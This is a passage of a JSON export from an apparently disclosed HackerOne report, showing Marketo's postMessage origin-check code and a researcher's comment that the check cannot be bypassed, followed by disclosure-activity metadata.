class=\"nx\"\u003eoriginalEvent\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003edata\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"nx\"\u003eiframeUrl\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eindexOf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eoriginalEvent\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eorigin\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e){\u003c/span\u003e\n    \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003ed\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"k\"\u003etry\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"nx\"\u003ed\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eparseJSON\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eoriginalEvent\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"k\"\u003ecatch\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eex\u003c/span\u003e\u003cspan class=\"p\"\u003e){\u003c/span\u003e\n      \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ed\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003emktoReady\u003c/span\u003e\u003cspan class=\"p\"\u003e){\u003c/span\u003e\n      \u003cspan class=\"nx\"\u003eonReady\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ed\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003emktoResponse\u003c/span\u003e\u003cspan class=\"p\"\u003e){\u003c/span\u003e\n      \u003cspan class=\"nx\"\u003eonResponse\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ed\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003emktoResponse\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e   \n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe iframeUrl is taken from the Marketo iframe element\u0026#39;s action attribute and, in HackerOne\u0026#39;s case, contains the value \u003ca title=\"https://app-sj17.marketo.com/index.php/form/XDFrame\" href=\"/redirect?url=https%3A%2F%2Fapp-sj17.marketo.com%2Findex.php%2Fform%2FXDFrame\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://app-sj17.marketo.com/index.php/form/XDFrame\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. The if statement checks that origin of the message has an indexOf 0 within the iframeUrl.\u003c/p\u003e\n\n\u003cp\u003eAs far as I can tell it shouldn\u0026#39;t be possible to bypass this - only messages from the app-sj17.marketo.com origin will be accepted.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-16T20:30:10.554Z","updated_at":"2018-12-16T20:30:10.554Z","actor":{"username":"adac95","cleared":false,"url":"/adac95","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3900910,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-12-28T14:37:49.734Z","updated_at":"2018-12-28T14:37:49.734Z","first_to_agree":true,"actor":{"username":"jobert","cleared":true,"url":"/jobert","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4184115,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-02-21T04:51:45.072Z","updated_at":"2019-02-21T04:51:45.072Z","actor":{"username":"adac95","cleared":false,"url":"/adac95","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4184116,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-02-21T04:51:45.182Z","updated_at":"2019-02-21T04:51:45.182Z","actor":{"username":"adac95","cleared":false,"url":"/adac95","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}